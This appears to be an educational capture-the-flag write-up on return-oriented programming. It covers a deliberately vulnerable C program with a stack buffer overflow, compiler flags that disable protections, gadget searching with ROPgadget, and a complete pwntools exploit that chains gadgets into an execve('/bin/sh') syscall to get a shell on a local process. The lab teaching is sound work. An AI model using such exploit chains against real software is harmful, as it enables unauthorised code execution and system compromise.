# Simple PWN - 0x07(ROP)
###### tags: `CTF` `PWN` `eductf`

## Background
* This is very similar to normal `BOF`.
* If a sample code that doesn't have a backdoor function and you cannot input a backdoor function as well, then you can use some code segment to merge a shellcode.
* Therefore, the main idea is use some `<operation>;ret` pattern segment to overlap stack.
![](https://imgur.com/YGarADK.png)

## Original Code
```c!=1
#include <stdio.h>
#include <unistd.h>

int main()
{
    setvbuf(stdin, 0, _IONBF, 0)
    setvbuf(stdout, 0, _IONBF, 0);

    char s[0x10];

    printf("Here is your \"/bin/sh\": %p\n", "/bin/sh");
    printf("Give me your ROP: ");
    read(0, s, 0x400);
    
    return 0;
}
```
* At line `11`, `%p` means pointer of `/bin/sh` string.
* Note that, if you establish the code yourself, you must turn off the protection by the command below and use `checksec` to observe the protection. In addition, please use `-static` command to compile library at compile time, so that we can get `ROP gadget` more easily.
    ```bash!
    gcc -o rop rop.c -zexecstack -no-pie -fno-stack-protector -z norelro -static
    ```

## Exploit
* First, we can observe the program has overflow(very important), but has no other backdoor method can access or global variable can write shellcode. Then we can consider to use `ROP gadget` to construct chain.
* Second, we use `ROPgadget` to find suitable gadget
    ```bash!
    $ ROPgadget --multibr --binary rop > rop_gadget
    $ vim rop_gadget
    ```
    ![](https://imgur.com/IzeTvgK.png)
    ![](https://imgur.com/PlA5C8B.png)
    ![](https://imgur.com/zg28Pti.png)
    ![](https://imgur.com/WDS0HUh.png)
    ![reference link](https://imgur.com/dEh7b5n.png)
    * Note that, you may consider that `pop rdx ; pop rbx ; ret` is not what we want. We just want `pop rdx ; ret`. Therefore, we have to push one more value for `pop rbx ;` instruction.
* Then, we can construct our payload:
    ```python!=
    from pwn import *

    context.arch = 'amd64'

    r = process('./rop')

    r.recvuntil('Here is your "/bin/sh": ')
    binsh = int(r.recvline()[:-1], 16)
    info(f"binsh: {hex(binsh)}")

    pop_rdi_ret = 0x401eaf
    pop_rsi_ret = 0x409ede
    pop_rdx_ret = 0x485aeb
    pop_rax_ret = 0x44fcc7
    syscall = 0x401c64
    ```
    * Note that, `r.recvline()[:-1]` is `b'0x498004'` and we must pop to `%rdi` at line `17` below.
* Then we can combine them together using [flat method](https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.flat). It'll flat the address with **length 8 bytes**.
    ```python!=16
    ROP = flat(
        pop_rdi_ret, binsh,
        pop_rsi_ret, 0,
        pop_rdx_ret, 0, 0,
        pop_rax_ret, 0x3b,
        syscall,
    )

    gdb.attach(r)
    r.sendafter("Give me your ROP: ", b'a' * 0x18 + ROP)

    r.interactive()
    ```
* Finally, we got shell!!!
    ![](https://imgur.com/dk0Z2mw.png)

## Analysis
* This is totally the same as our hypothesis.
![](https://imgur.com/OjcDNbu.png)
* We can see that all parameters are ready
    ![](https://imgur.com/xXx7HRQ.png)
## Reference
[NTUSTISC - Pwn Basic 3 [2019.03.26]](https://youtu.be/iA4Hrr17ooI?t=1239)
[Pwn week1](https://youtu.be/ktoVQB99Gj4?t=6712)